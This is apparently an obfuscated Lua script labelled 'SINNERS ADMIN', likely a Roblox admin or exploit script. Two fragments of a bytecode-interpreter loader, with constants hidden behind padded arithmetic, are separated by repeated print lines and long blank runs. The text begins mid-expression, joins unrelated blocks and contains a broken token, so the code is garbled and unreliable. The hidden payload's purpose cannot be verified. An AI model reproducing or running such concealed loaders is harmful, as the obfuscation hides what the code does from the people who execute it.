-(134 + 399))) and (v304==(1583 -(1003 + 580)))) then v305=0 + 0;v306=nil;v304=1 -0;end end end,__newindex=function(v300,v301,v302)local v307=0 + 0;local v308;local v309;local v310;while true do if (((2418 + 776)<=(3421 -(8 + 15))) and ((1043 -(472 + 571))==v307)) then v308=0 + (0 -0);v309=nil;v307=1;end if (((1529 -((189 -89) + 1428))==v307) or ((1013 -(646 + 147))>=(7866 -5593))) then v310=nil;while true do if ((v308==((0 -0) + 0)) or ((9044 -5298)<=1398)) then local v326=0;while true do if (((1715 + 147 + 808)<(808 + 4072)) and (v326==(0 + (0 -0)))) then v309=1119 -(565 + 554);v310=nil;v326=2 -1;end if ((248==248) and ((363 -(345 + 17))==v326)) then v308=1 -0;break;end end end if ((v308==(1 + 0 + 0)) or ((1021 + 1124)==(2309 + 2007))) then while true do if (((1141 -(57 + 725 + 42))<(91 + 2411)) and (v309==0)) then v310=v156[v301];v310[1 + 0][v310[2 + 0]]=v302;break;end end break;end end break;end end end});v257=1;end end break;end end end end break;end if (((3148 -(360 + 145))<(5937 -(98 + 1342))) and (v152==0)) then local v221=0;while true do if ((v221==(258 -(107 + 150))) or ((10322 -6437)<1776)) then v152=900 -(889 + 10);break;end if (((1285 -(119 + 554))==((2811 -(1747 + 242)) -(164 + 46))) and (v221==0)) then v153=0 -0;v154=nil;v221=1;end end end if (((5979 -3467)>44) and (v152==(184 -(103 + 80)))) then v155=nil;v156=nil;v152=2 + 0;end end break;end if ((v151==(1667 -(387 + 1280))) or ((11375 -7046)==(1840 + 2611))) then v152=1762 -(1605 + 157);v153=nil;v151=1554 -(1389 + (501 -337));end end elseif ((v87==(25 + 8)) or (754==((26364 -18144) -5389))) then local v196=0 -0;local v197;local v198;local v199;local v200;while true do if (((1349 -((756 -478) + 26))<=(3920 + 745)) and (v196==(0 -0))) then v197=1846 -(123 + 1723);v198=nil;v196=1 + 0;end if (((7247 -2467)==(346 + 4434)) and ((2 + 0)==v196)) then while true do if (((4842 -1952)==(7225 -4335)) and (v197==(1 + 0))) then v200=nil;while true do if ((v198==(356 -(183 + 173))) or ((978 + 166)>(4675 -(1201 + (1546 -1063))))) then local v273=1106 -(52 + 1054);while true do if (((9486 -4884)>=(6343 -(8662 -6376))) and ((0 + 0 + 0)==v273)) then local v289=0;while true do if (((398 + 98)<=(3711 -1647)) and ((1022 -(614 + 407))==v289)) then v273=1 + 0;break;end if (((1677 -(1032 + 645))==v289) or ((2503 -947)==(2400 -(16 + 4)))) then v199=v86[1 + 1];v200={};v289=1;end end end if ((v273==(644 -(452 + 191))) or ((473 -(14 + 22))>=(7642 -2984))) then v198=1 -(0 + 0);break;end end end if (((1765 -(1299 + 465))==v198) or ((3751 -2260)>=(2065 + 609))) then for v282=4 -3, #v83 do local v283=0;local v284;local v285;while true do if ((v283==(2 -1)) or ((4925 -(1114 + 756))>(1694 + 2163))) then while true do if (((2851 -(1016 + 706))<=2151) and (v284==0)) then v285=v83[v282];for v314=0 -0, #v285 do local v315=(0 + 0) -0;local v316;local v317;local v318;while true do if (((3180 + 1226)==(12511 -8105)) and (v315==(1109 -(799 + 310)))) then v316=v285[v314];v317=v316[1 -0];v315=1076 -(1014 + 61);end if (((8424 -5483)==(5553 -2612)) and (v315==(494 -(409 + 84)))) then v318=v316[1 + 1];if (((v317==v84) and (v318>=v199)) or ((4079 -(618 + 46))>4720)) then local v327=0;while true do if (((535 -(228 + 307))==v327) or ((2563 -(614 + 672))==(2193 + 250 + 2424))) then v200[v318]=v317[v318];v316[(869 -(789 + 78)) -1]=v200;break;end end end break;end end end break;end end break;end if (((2521 + 613)==(1883 + 1251)) and (v283==(319 -(58 + 161 + 100)))) then v284=(0 + 0) -0;v285=nil;v283=600 -((869 -292) + 22);end end end break;end end break;end if (((254 + 192)<(5217 -(238 + (5 -2)))) and ((0 -0)==v197)) then local v247=0 + 0;while true do if (((4779 -(525 + (1456 -(105 + 1009))))>=(5101 -(1272 + 111))) and ((1 + 0)==v247)) then v197=1 + 0;break;end if ((0==v247) or ((1866 -(534 + 190))>(6689 -3963))) then v198=0 + 0;v199=nil;v247=1;end end end end break;end if ((v196==(1 + 0)) or ((3129 + 1337)==3251)) then v199=nil;v200=nil;v196=5 -3;end end else do return;end end elseif ((4524==(5748 -(1188 + 36))) and (v87<=(187 -(95 + 56)))) then if (((2096 -((954 -(536 + 343)) + (9 -5)))<(4321 -(4 + 352))) and (v87==35)) then local v157=1619 -(793 + 826);local v158;local v159;while true do if ((((3529 -(452 + 1370)) -(344 + 1362))==v157) or ((2304 + 1351)<(747 -(279 + 74)))) then v84[v158 + (1 -(0 -0))]=v159;v84[v158]=v159[v86[1895 -(1580 + 311)]];break;end if (((1845 + 846)==2691) and ((563 -(64 + 499))==v157)) then v158=v86[2 + (0 -0)];v159=v84[v86[456 -(312 + 141)]];v157=1 -(61 -(35 + 26));end end else local v160=0;local v161;local v162;while true do if ((v160==(1 + 0)) or (2781<(904 + 635))) then while true do if (((1118 -686)<=(3906 + (337 -231))) and ((285 -(36 + 249))==v161)) then v162=v86[4 -2];v84[v162](v13(v84,v162 + 1,v86[10 -7]));break;end end break;end if ((v160==(0 -0)) or ((1070 + 2508)>4998)) then v161=0 + 0;v162=nil;v160=1;end end end elseif ((v87<=(162 -125)) or ((35 + 793)>=(4422 + 319))) then local v163=0;local v164;local v165;local v166;local v167;local v168;local v169;while true do if ((4988>=(2279 -(1114 + 65))) and (v163==(2 -1))) then local v212=0 + 0;while true do if ((v212==(0 -0)) or (2475<(34 + 1885))) then v166=nil;v167=nil;v212=(176 -(148 + 27)) -0;end if ((v212==(2 -1)) or ((5802 -4191)>(5218 -(519 + 1457)))) then v163=1692 -(346 + (1728 -(72 + 312)));break;end end end if ((v163==(2 + 1)) or ((1265 -(1400 -(583 + 27)))==2579)) then while true do if ((3179>(865 -(32 + 14))) and (v164==(0 + 0))) then local v222=125 -(15 + 110);local v223;while true do if (((1978 + 1080)>(3176 -(114 + 145))) and (v222==(0 -0))) then v223=0 -(0 -0);while true do if ((v223==(1 + 0 + 0)) or ((11006 -7021)<=(1768 + 1182))) then v164=1;break;end if ((1073>(212 + 633)) and (v223==(388 -(360 + 28)))) then local v286=0 -0;while true do if ((2238<(854 + 2000)) and (v286==(1 + 0))) then v223=1 -0;break;end if ((v286==0) or ((1440 -(30 + 107))<=(1653 -(135 + 398)))) then v165=v86[1395 -(1090 + 303)];v166=v86[1 + 3];v286=2 -1;end end end end break;end end end if ((3==v164) or ((5601 -(381 + 750))>(5269 -((1602 -(204 + 1219)) + 105)))) then if (((6414 -(1113 + 362))>=(5268 -(383 + 6))) and v169) then local v248=0 + 0;local v249;while true do if ((v248==(0 -0)) or ((293 -93)>=((20901 -16376) -(1218 + 494)))) then v249=(0 + 0) -0;while true do if ((v249==(0 -0)) or ((533 + 100)>(406 + 924))) then v84[v167]=v169;v68=v86[3];break;end end break;end end else v68=v68 + ((112 -(5 + 105)) -(482 -(169 + 312)));end break;end if ((v164==(2 + 0 + 0)) or ((1901 + 3074)==(5429 -(403 + 390)))) then local v224=0 + 0;while true do if ((v224==(1 -(927 -(57 + 870)))) or ((2303 -(5 + 50))<=344)) then v164=6 -3;break;end if ((v224==(0 -0)) or ((14481 -10709)<374)) then for v268=1,v166 do v84[v167 + v268]=v168[v268];end v169=v168[1];v224=(592 -(78 + 513)) + 0;end end end if ((v164==(1562 -(122 + 1439))) or ((4409 -(645 + 42))==((261 + 2) -92))) then local v225=(0 + 0) -0;while true do if ((v225==(0 + 0)) or ((3562 -(3230 -(245 + 1454)))>=(1061 + 3272))) then local v258=0 -0;while true do if (((3352 -(95 + 68))>(2656 -1105)) and (v258==(0 -0))) then v167=v165 + (875 -(686 + 187));v168={v84[v165](v84[v165 + 1],v84[v167])};v258=1 -0;end if ((v258==(1910 -(1308 + 601))) or (3029>=(4573 -(338 + 82)))) then v225=1;break;end end end if ((1490<=(9563 -5880)) and (v225==(732 -(433 + 298)))) then v164=2 + 0;break;end end end end break;end if ((v163==(190 -(188 + 2))) or ((4472 -3255)==(6724 -((1617 -(692 + 486)) + 1411)))) then v164=0 + 0;v165=nil;v163=1904 -(637 + 1266);end if ((v163==(2 + 0)) or ((12283 -9413)<=(1720 + 853))) then v168=nil;v169=nil;v163=7 -4;end end elseif ((v87>(88 -50)) or ((1808 + 2636)<=3670)) then v84[v86[1974 -(165 + 1807)]]=v84[v86[6 -(1006 -(717 + 286))]][v86[(32 + 319) -(258 + (297 -208))]];elseif (((2511 -1779)<=(2856 + 63)) and (v84[v86[3 -1]]~=v86[4 + 0])) then v68=v68 + (2 -1);else v68=v86[1866 -(1216 + 647)];end v68=v68 + ((3438 -2374) -(771 + 292));break;end if ((v94==(0 + 0)) or (2169==(116 + 385))) then local v108=0 + 0;while true do if (((2530 -1972)<=((10319 -(1054 + 521)) -4216)) and (v108==((729 + 642) -((1465 -(1097 + 37)) + 1039)))) then v94=930 -(426 + 503);break;end if (((2625 -(91 + 6))==((1704 -(372 + 211)) + 1407)) and (v108==(0 -0))) then v86=v77[v68];v87=v86[1 -0];v108=668 -(477 + 190);end end end end break;end end break;end end end end A,B=v28(v11(v72));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v31[4][v68] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v30(v29(),{},v17)();end if (v18==1) then function v21(v34,v35,v36)if v36 then local v73=(v34/(2^(v35-1)))%((4 -2)^(((v36-(547 -(138 + 408))) -(v35-(2 -1))) + (1177 -(371 + 805))));return v73-(v73%(1 + 0 + 0));else local v74=((1440 -724) -(169 + 545))^(v35-(2 -1));return (((v34%(v74 + v74))>=v74) and (1 -0)) or (0 + 0 + 0);end end v22=nil;function v22()local v59=0 -0;local v60;while true do if (v59==1) then return v60;end if ((0 -0)==v59) then v60=v2(v16,v19,v19);v19=v19 + 1 + 0;v59=1;end end end v23=nil;v18=2;end if (v18==3) then function v25()local v61=1441 -(338 + 146 + 957);local v62;local v63;while true do if (v61==(1474 -(558 + 915))) then return (( -2 * v21(v63,30 + 2)) + (1 -0)) * ((4 -2)^(v21(v63,17 + 4,463 -(229 + 203)) -1023)) * ((((v21(v63,1 + 0,12 + 8) * ((5 -3)^(556 -(33 + 491)))) + v62)/((2 + 0)^(26 + 11 + 15))) + 1 + 0);end if (v61==(0 -0)) then v62=v24();v63=v24();v61=4 -(5 -2);end end end v26=nil;function v26(v37)local v64;if  not v37 then local v75=0 -0;while true do if (v75==(0 + 0)) then v37=v24();if (v37==(0 -0)) then return "";end break;end end end v64=v4(v16,v19,(v19 + v37) -(1 + 0));v19=v19 + v37;local v65={};for v66=1 + 0, #v64 do v65[v66]=v3(v2(v4(v64,v66,v66)));end return v7(v65);end v27=v24;v18=4;end if (v18==0) then v19=1;v20=nil;v16=v5(v4(v16,5),"..",function(v38)if (v2(v38,2)==79) then v20=v1(v4(v38,1,1));return "";else local v76=v3(v1(v38,16));if v20 then local v90=v6(v76,v20);v20=nil;return v90;else return v76;end end end);v21=nil;v18=1;end end end v0=4;end end end
--
--
print("SINNERS ADMIN")
---
---
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")

------
print("SINNERS ADMIN")

----
print("SINNERS ADMIN")

print("SINNERS ADMIN")

---------------------
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")


print("SINNERS ADMIN")
------
print("SINNERS ADMIN")
--
print("SINNERS ADMIN")


----------------
print("SINNERS ADMIN")


----------------------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")
-----------
-------------------------
print("SINNERS ADMIN")


-----------
------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")

print("SINNERS ADMIN")
----------------------------------------------------------
print("SINNERS ADMIN")






------------------------------------------------
print("SINNERS ADMIN")
















---------------------------------------
print("SINNERS ADMIN")























---------------------------------------
print("SINNERS ADMIN")


































































































































































































































































































































































do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==4) then vv9());break;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v74=v6(v62,v19);v19=nil;return v74;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=0 -0;local v64;while true do if (v63==(0 + 0)) then v64=(v31/((6 -4)^(v32-(3 -2))))%(2^(((v33-(1 -0)) -(v32-(1804 -((2504 -954) + 253)))) + (4 -3) + (238 -(52 + 186))));return v64-(v64%1);end end else local v65=(1907 -(1904 + 1))^(v32-(1 + 0));return (((v31%(v65 + v65))>=v65) and ((2 -1) + 0)) or (0 + 0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (7 -5));v18=v18 + (192 -(180 + 10));return (v40 * (636 -380)) + v39;end local function v23()local v41,v42,v43,v44=v2(v16,v18,v18 + 3);v18=v18 + (561 -(19 + 538));return (v44 * (16777816 -(297 + 303))) + (v43 * 65536) + (v42 * (212 + 16 + 28)) + v41;end local function v24()local v45=v23();local v46=v23();return (( -((1126 -(1021 + 103)) + 0) * v20(v46,(1597 -(1563 + 15)) + 13)) + 1 + 0) * ((1 + 1)^(v20(v46,25 -4,31) -((2344 -1839) + 518))) * ((((v20(v46,761 -(317 + 443),89 -69) * (2^(61 -29))) + v45)/((1 + 1)^(42 + 10))) + (230 -(220 + 9)));end local function v25(v34)local v47;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v47=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;local v48={};for v60=1913 -(855 + 1057), #v47 do v48[v60]=v3(v2(v4(v47,v60,v60)));end return v7(v48);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v49=0 -0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==0) then local v71=0 -0;while true do if (v71==(1 + 0)) then v49=1;break;end if (v71==(0 + 0)) then local v93=0;while true do if (v93~=1) then else v71=1;break;end if (v93~=0) then else v50=0;v51=nil;v93=1;end end end end end if (3==v49) then v56=nil;while true do local v75=0 + 0;local v76;while true do if (v75==(0 -0)) then v76=0;while true do if (v76==(1 -0)) then if (v50~=(396 -(341 + 54))) then else local v99=0;while true do if (v99==(1 + 0)) then v56={};v50=2;break;end if (v99==0) then v54={v51,v52,nil,v53};v55=v23();v99=1;end end end if (v50~=(1762 -(1072 + 687))) then else local v100=267 -(260 + 7);local v101;while true do if ((1723 -(590 + 1133))~=v100) then else v101=0;while true do local v102=0;local v103;while true do if (v102==(1183 -(165 + 1018))) then v103=0 -0;while true do if (v103==0) then if (v101~=(1355 -(1113 + 241))) then else return v54;end if (v101==(0 -0)) then local v157=0 -0;local v158;while true do if (v157==0) then v158=0 + 0;while true do if (v158==1) then v101=1583 -(1505 + 77);break;end if (v158==(0 -0)) then local v204=0 + 0;while true do if (v204==(1721 -(277 + 1444))) then for v217=1277 -(698 + 578),v23() do v52[v217-1]=v28();end for v219=1135 -(792 + 342),v23() do v53[v219]=v23();end v204=1;end if (v204==(3 -2)) then v158=4 -3;break;end end end end break;end end end break;end end break;end end end break;end end end break;end if (v76==0) then local v96=0 -0;local v97;while true do if (0==v96) then v97=0;while true do if (v97~=0) then else if (v50~=(1505 -(1458 + 45))) then else local v104=0;while true do if (v104==(0 -0)) then local v109=0 + 0;while true do if (v109~=(0 + 0)) then else local v159=0;while true do if (v159==(1 + 0)) then v109=1 -0;break;end if (v159==0) then for v191=1,v55 do local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v195=nil;v196=nil;v192=2;end if (v192~=2) then else while true do if (v193==0) then local v221=0;local v222;while true do if ((0 + 0)==v221) then v222=0 + 0;while true do if (v222==1) then v193=1 + 0;break;end if (v222~=(0 + 0)) then else local v237=0;while true do if (v237~=1) then else v222=1;break;end if (v237~=(146 -(54 + 92))) then else v194=0;v195=nil;v237=1 + 0;end end end end break;end end end if (v193==1) then v196=nil;while true do if (v194==(436 -(110 + 325))) then if (v195==(253 -(24 + 228))) then v196=v21()~=(868 -(518 + 350));elseif (v195==2) then v196=v24();elseif (v195~=(848 -(322 + 523))) then else v196=v25();end v56[v191]=v196;break;end if (v194~=(0 -0)) then else local v231=0 + 0;local v232;local v233;while true do if (v231==(91 -(17 + 74))) then v232=0;v233=nil;v231=512 -(45 + 466);end if (v231==(1 + 0)) then while true do if (v232~=(0 -0)) then else v233=0 -0;while true do if (v233~=(0 + 0)) then else local v248=0;while true do if (v248~=(179 -(119 + 60))) then else v195=v21();v196=nil;v248=1;end if (v248~=1) then else v233=55 -(36 + 18);break;end end end if (v233~=(1981 -(1651 + 329))) then else v194=1;break;end end break;end end break;end end end end break;end end break;end if (v192==0) then v193=0;v194=nil;v192=1;end end end v54[56 -(28 + 25)]=v21();v159=1 + 0;end end end if (1==v109) then v104=1;break;end end end if (v104==(1611 -(939 + 671))) then for v150=2 -1,v23() do local v151=0;local v152;local v153;local v154;while true do if (v151==1) then v154=nil;while true do if (v152~=1) then else while true do if (v153~=(0 + 0)) then else v154=v21();if (v20(v154,1 + 0,1 + 0)==0) then local v211=0;local v212;local v213;local v214;local v215;local v216;while true do if (v211~=(2 + 0)) then else v216=nil;while true do if (v212~=0) then else v213=525 -(411 + 114);v214=nil;v212=1 -0;end if (v212~=1) then else local v236=0;while true do if (v236~=(1 + 0)) then else v212=2;break;end if (0==v236) then v215=nil;v216=nil;v236=934 -(168 + 765);end end end if (v212==2) then while true do if (v213~=(1 + 1)) then else if (v20(v215,1020 -(405 + 614),1 + 0)~=(1 + 0)) then else v216[779 -(280 + 497)]=v56[v216[2 -0]];end if (v20(v215,1677 -(858 + 817),2)==1) then v216[3]=v56[v216[1966 -(272 + 1691)]];end v213=11 -8;end if (1~=v213) then else local v240=0;while true do if (v240~=(283 -(112 + 171))) then else v216={v22(),v22(),nil,nil};if (v214==0) then local v249=0 -0;while true do if (v249==(0 + 0)) then v216[1 + 2]=v22();v216[4]=v22();break;end end elseif (v214==1) then v216[1722 -(74 + 1645)]=v23();elseif (v214==2) then v216[738 -(309 + 426)]=v23() -((2 -0)^16);elseif (v214==3) then local v254=0;while true do if (v254~=0) then else v216[3]=v23() -(2^16);v216[8 -4]=v22();break;end end end v240=2 -1;end if (v240~=1) then else v213=1 + 1;break;end end end if (v213==(1739 -(1216 + 523))) then local v241=925 -(115 + 810);while true do if (v241~=0) then else v214=v20(v154,2,2 + 1);v215=v20(v154,4,6);v241=1 + 0;end if (v241==1) then v213=1 -0;break;end end end if (v213==(104 -(90 + 11))) then if (v20(v215,3,3)==(918 -(707 + 210))) then v216[4]=v56[v216[3 + 1]];end v51[v150]=v216;break;end end break;end end break;end if (v211==(0 -0)) then v212=290 -(20 + 270);v213=nil;v211=1997 -(1681 + 315);end if (v211~=1) then else v214=nil;v215=nil;v211=2 + 0;end end end break;end end break;end if (0==v152) then v153=0;v154=nil;v152=1 + 0;end end break;end if (v151==(437 -(142 + 295))) then v152=1883 -(1178 + 705);v153=nil;v151=3 -2;end end end v50=8 -5;break;end end end if (v50==0) then local v105=0;local v106;local v107;while true do if (v105~=(3 -2)) then else while true do if (v106~=0) then else v107=0 + 0;while true do if (v107==(0 + 0)) then local v184=634 -(174 + 460);while true do if (v184~=(0 + 0)) then else v51={};v52={};v184=1799 -(15 + 1783);end if ((1 + 0)~=v184) then else v107=1;break;end end end if (v107~=(1 + 0)) then else v53={};v50=1 + 0;break;end end break;end end break;end if (v105~=0) then else v106=0;v107=nil;v105=1;end end end v97=1 + 0;end if (v97~=1) then else v76=1 + 0;break;end end break;end end end end break;end end end break;end if (v49~=(2 -1)) then else local v72=0;while true do if (v72~=0) then else v52=nil;v53=nil;v72=1228 -(1134 + 93);end if (v72==1) then v49=261 -(218 + 41);break;end end end if (v49==2) then local v73=1352 -(993 + 359);while true do if ((981 -(99 + 881))~=v73) then else v49=2 + 1;break;end if (v73==(0 + 0)) then v54=nil;v55=nil;v73=1149 -(1146 + 2);end end end end end local function v29(v35,v36,v37)local v57=v35[1];local v58=v35[2];local v59=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v77=v57;local v78=Const;local v79=v58;local v80=v59;local v81=v27;local v82={};local v83={};local v84={};for v90=0 + 0,v69 do if ((((665 + 169) -430)==(539 -(14 + 121))) and (v90>=v80)) then v82[v90-v80]=v68[v90 + (2 -1)];else v84[v90]=v68[v90 + (361 -(126 + 234))];end end local v85=(v69-v80) + (1627 -(1222 + 404));local v86;local v87;while true do local v91=0 -0;local v92;while true do if (((6973 -4044)>=(1891 -(1069 + 559))) and (v91==(0 -0))) then v92=0 -0;while true do if ((v92==(1471 -(1036 + 435))) or ((2403 -(550 + 1427))>=(6605 -3206))) then local v98=0 -(0 + 0);while true do if (((3401 + 1096)>=(2490 + (3925 -2433))) and (v98==(0 -0))) then v86=v77[v66];v87=v86[2 -1];v98=1 + 0;end if ((v98==(1 + 0)) or ((1791 + 382)>(3888 + 692))) then v92=1 + 0;break;end end end if ((v92==(1 + 0)) or ((2743 -(2342 -(426 + 324)))==(3838 -(1035 + 733)))) then if ((v87<=(444 -(297 + 134))) or ((13848 -10128)>(4830 -(368 + 724)))) then if (((6481 -2683)==(354 + 3444)) and (v87<=(6 + 0))) then if (((7225 -5065)==(2556 -(285 + 111))) and (v87<=(551 -(224 + 325)))) then if ((v87<=(1106 -(16 + 1090))) or ((353 + 62)>=(2262 -(36 + 813)))) then if ((v86[2 -0]==v84[v86[5 -1]]) or ((2347 + 2049)<(1976 + 495))) then v66=v66 + (1202 -(1176 + 25));else v66=v86[1 + 2];end elseif (((5677 -2741)==(5210 -2274)) and (v87==(1345 -(21 + 1323)))) then local v110=0 + 0;local v111;local v112;local v113;while true do if ((v110==(1 + 0)) or ((2049 -(280 + 486))==(12764 -8814))) then v113=nil;while true do if ((v111==(1 + 0)) or ((1907 -(538 + (1905 -(1486 + 351))))>(3296 -(720 + 99 + 27)))) then v84[v112 + (1103 -(987 + (330 -215)))]=v113;v84[v112]=v113[v86[966 -(371 + 591)]];break;end if (((4926 -(1296 + (422 -278)))>=(2427 + 659)) and (v111==(0 + 0))) then local v187=0 + 0;local v188;while true do if (((934 + 1067)>(370 + 232)) and (v187==(0 + 0))) then v188=0 -0;while true do if ((((7087 -4224) -(43 + (499 -(86 + 315))))==((5730 -(662 + 836)) -(848 + 662))) and (v188==(1782 -(511 + 1270)))) then v111=1509 -(1139 + 369);break;end if ((v188==(0 + 0)) or ((10583 -7931)<(581 + 1512))) then v112=v86[1773 -(59 + 1712)];v113=v84[v86[439 -(254 + 182)]];v188=1815 -((3401 -(1156 + 823)) + 392);end end break;end end end end break;end if (((578 -326)==(344 -((213 -124) + 3))) and (v110==(301 -(39 + 262)))) then local v160=629 -(194 + 435);while true do if (((1608 -(1021 + 471))<(1671 -(85 + 554 + 624))) and (v160==(1509 -(147 + 1361)))) then v110=1228 -(261 + 966);break;end if (((1832 -403)<=(1347 + 2524)) and (v160==(0 + (462 -(204 + 258))))) then v111=676 -(406 + 270);v112=nil;v160=2 -1;end end end end else for v155=v86[(1273 -(335 + 936)) + 0],v86[1 + 2] do v84[v155]=nil;end end elseif ((v87<=(3 + 1)) or ((108 + 840)>(1656 + 2578))) then if (((5343 -(45 + 314))>(244 + 128)) and (v87==3)) then do return;end else local v114=0 -0;local v115;local v116;while true do if (((198 + 3762)<(9010 -4911)) and (v114==((836 -532) -(167 + 136)))) then for v165=(2 -1) + 0, #v83 do local v166=0 + 0;local v167;while true do if ((v166==((496 + 1197) -(1304 + 389))) or ((16999 -12312)<(173 + 191))) then v167=v83[v165];for v197=0 + 0, #v167 do local v198=0 -0;local v199;local v200;local v201;local v202;while true do if ((v198==(1 -0)) or ((401 -(7 + 213 + 159))==(239 + 146))) then v201=nil;v202=nil;v198=8 -6;end if ((v198==(698 -(233 + 465))) or ((3426 -1644)<=(304 + 1258))) then local v206=0 + 0;while true do if (((0 + 0)==v206) or ((495 -265)>(5082 -(959 + 125)))) then v199=0 + 0;v200=nil;v206=2 -1;end if (((9800 -6070)>(10105 -6700)) and (v206==(1205 -(180 + 1024)))) then v198=(2 -1) -0;break;end end end if ((v198==(1625 -(956 + 667))) or ((2531 + 1060)==(2861 + 1464))) then while true do if ((((1480 -(57 + 242)) -(90 + 809))==(2261 -(1168 + 811))) and (((2363 -(733 + 895)) -(681 + 36 + 18))==v199)) then local v226=566 -((972 -543) + 137);local v227;while true do if ((((1739 -(780 + 343)) + 2103)>=(1483 + 45)) and (v226==(0 + 0))) then v227=0 + 0;while true do if ((v227==(1 + 0 + (1506 -(921 + 585)))) or ((2680 -1849)==(5450 -(935 + 872)))) then v199=2 -1;break;end if ((v227==(0 + 0)) or ((4047 -(28 + 39))>=(5642 -(683 + 420)))) then local v238=0 + 0;while true do if (((4749 -(142 + 997))<=(2324 + 2348)) and (v238==((1 + 3) -3))) then v227=1 + 0;break;end if ((v238==(0 -0)) or ((10094 -6315)==(253 -50))) then v200=v167[v197];v201=v200[1 + 0];v238=1 + 0;end end end end break;end end end if ((v199==(2 -1)) or ((12942 -8196)<=(12314 -8180))) then v202=v200[(80 + 290) -(34 + 334)];if (((524 + (3864 -(661 + 1103)))>(1588 -1121)) and (v201==v84) and (v202>=v115)) then local v234=0 + 0;local v235;while true do if (((3295 -1595)<=(3057 + 249)) and (v234==(952 -(42 + 910)))) then v235=0 + 0;while true do if ((v235==(0 -0)) or ((4384 -1914)>(1308 + 1874 + 207))) then v116[v202]=v201[v202];v200[1 + 0]=v116;break;end end break;end end end break;end end break;end end end break;end end end break;end if (((1983 -1196)<=(1693 + 276)) and (v114==(0 + 0))) then local v161=0;while true do if (((5306 -(654 + 978))==(4929 -(805 + 450))) and (v161==(1041 -((3728 -2750) + 62)))) then v114=162 -(82 + 79);break;end if ((v161==(0 -0)) or ((19649 -15423)<(49 + 134))) then v115=v86[1449 -(99 + 1348)];v116={};v161=(1 -0) -0;end end end end end elseif ((v87==(9 -4)) or ((2947 -(543 + 514))>=(3164 + 98))) then local v117=0 + 0;local v118;local v119;local v120;while true do if ((v117==(313 -(246 + 67))) or ((6897 -4519)>=(1729 + 2069))) then v118=(1616 -(408 + 1208)) -0;v119=nil;v117=881 -(786 + 94);end if (((4019 -787)>(1711 -(2143 -(704 + 381)))) and (v117==(2 -1))) then v120=nil;while true do if (((1938 -((1836 -(118 + 36)) + 255))==v118) or ((2723 + 1470)<=(1113 -653))) then while true do if (((0 + 0)==v119) or ((4898 -2682)<=(1236 -593))) then v120=v86[2];v84[v120]=v84[v120](v84[v120 + (1767 -(394 + 1372))]);break;end end break;end if (((0 + 0)==v118) or ((371 + 1934)<=(3590 -(901 + 534)))) then local v189=1152 -(1140 + 12);while true do if ((v189==(0 + 0)) or ((1056 -641)==(2462 + 719))) then v119=0 + 0;v120=nil;v189=1 -0;end if ((((784 + 5050) -3794)<=(4012 -1469)) and (v189==(2 -1))) then v118=1 + 0;break;end end end end break;end end else local v121=1385 -(1007 + 378);local v122;while true do if (((215 + 3484)<=(1746 + 1978)) and (v121==(1295 -(173 + 1122)))) then v122=v86[2 + 0];v84[v122]=v84[v122](v13(v84,v122 + (1 -(0 -0)),v86[1936 -(326 + 1607)]));break;end end end elseif (((3203 -2381)==(2254 -1432)) and (v87<=(30 -21))) then if ((v87<=(2 + 5)) or ((5386 -2643)>(417 + 2395))) then if (((6133 -4080)>=(1482 -1009)) and (v84[v86[877 -(149 + 726)]]~=v86[641 -(305 + (1722 -(385 + 1005)))])) then v66=v66 + (567 -(51 + 515));else v66=v86[3 -0];end elseif ((v87>((1534 -945) -(89 + 492))) or ((5733 -(180 + 734))<=(357 + 1042))) then v84[v86[5 -3]]=v37[v86[5 -2]];else local v124=1718 -(576 + 1142);local v125;while true do if ((818<=(5286 -(73 + 701))) and (v124==(0 + 0))) then v125=v86[(2 -1) + 1];v84[v125](v13(v84,v125 + 1 + 0,v86[(4 -3) + (7 -5)]));break;end end end elseif ((v87<=(6 + 5)) or ((3076 -(665 + 44))==(1027 + 2751))) then if (((12 + 4044 + 299)>(2718 + 1503)) and (v87>(29 -19))) then local v126=0 + 0 + 0;local v127;local v128;while true do if ((v126==1) or ((1478 + 1343)<(1849 -(1242 + 361)))) then while true do if (((6215 -(383 + 1490))>=(12935 -9776)) and (v127==(0 + 0))) then v128=v86[1551 -(138 + 1411)];do return v13(v84,v128,v128 + v86[2 + 1]);end break;end end break;end if ((v126==(0 -0)) or ((10221 -7012)<(458 -((784 -504) + (119 -71))))) then local v163=0 -0;while true do if ((v163==(0 + 0)) or ((5002 -(1326 + 519))<(2765 -1158))) then v127=0 -0;v128=nil;v163=1 + 0;end if ((v163==(3 -2)) or (1176>=(7170 -2288))) then v126=1 + 0;break;end end end end else v84[v86[690 -(428 + 260)]]={};end elseif (((6722 -4188)==(3281 -(300 + 447))) and (v87>(1232 -(20 + 258 + 942)))) then v84[v86[5 -3]]=v86[3 + 0]~=(252 -(208 + 44));else v66=v86[641 -(222 + 416)];end elseif (((3184 -1282)==(7034 -5132)) and (v87<=((14 -7) + 13))) then if (((4325 -(38 + 819))<=(4296 -(33 + 1 + 483))) and (v87<=(13 + 3))) then if ((v87<=(6 + 8)) or ((265 + 